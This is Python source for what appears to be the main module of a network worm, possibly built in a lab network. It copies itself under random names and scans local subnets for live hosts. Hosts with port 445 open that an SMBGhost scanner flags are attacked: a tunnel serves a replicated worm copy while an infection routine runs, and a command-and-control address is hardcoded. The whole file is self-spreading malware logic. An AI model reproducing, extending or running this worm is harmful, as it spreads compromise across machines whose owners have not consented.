import sys, os, platform, time
import armory.SMBGhost.cve20220796scanner as cve20220796scanner
from sniff import sniff
from infect import infect
import tunnel as comm
from replicate import replicate
import uuid


def main():
    if len(sys.argv) > 2:
        if sys.argv[1] == "--path":
            file_path = sys.argv[2]
        elif sys.argv[1] == "--attack" and sys.argv[2] == "windows":
            file_path = "tworm.exe"
    else:
        file_path = sys.argv[0]
    
    if "exe" in file_path:
        clone(file_path, str(uuid.uuid4()) + ".exe")
    else:
        clone(file_path, str(uuid.uuid4())+file_path)
    
    c2_server = "192.168.56.108"
    not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
    network = sniff()
    for local_ip in network.get_host_networks().keys():
        for target_ip in network.get_alive_hosts(local_ip):
            target_port_details = network.get_host_port_details(target_ip)
            print("Scanning Host:{} for port service".format(target_ip.address))
            if target_ip.address in target_port_details.keys():
                for running_port in target_port_details[target_ip.address]["ports"]:
                    port = running_port["portid"]
                    print("Host: {} - running port:{}".format(target_ip.address, port))
                    if not target_ip.address in not_testing_targets:
                        attack = (cve20220796scanner.is_vulnerable(target_ip.address) and port == "445")
                        if attack:
                            print("start to attack")
                            #local_ip = "0.0.0.0"
                            print("attacking port{}".format(running_port))
                            listening_port = 1337
                            worm = replicate(file_path)
                            tunnel = comm.tunnel(worm,local_ip, listening_port)
                            tunnel.start()
                            
                            time.sleep(2)
                            infection = infect(target_ip.address,int(port), local_ip, listening_port)
                            infection.start()
                            
                            infection.join()
                            tunnel.join()
                            
                            tunnel.close_connection(target_ip.address)

def clone(file_path, filename):
    try:
        fullpath=os.getcwd()
        self_clone = replicate(file_path, fullpath)
        self_clone.self_replicate(platform.system(),file_path, filename)
    except Exception as e:
        print("Clone Error: {}".format(e))
        

if __name__=='__main__':
    main()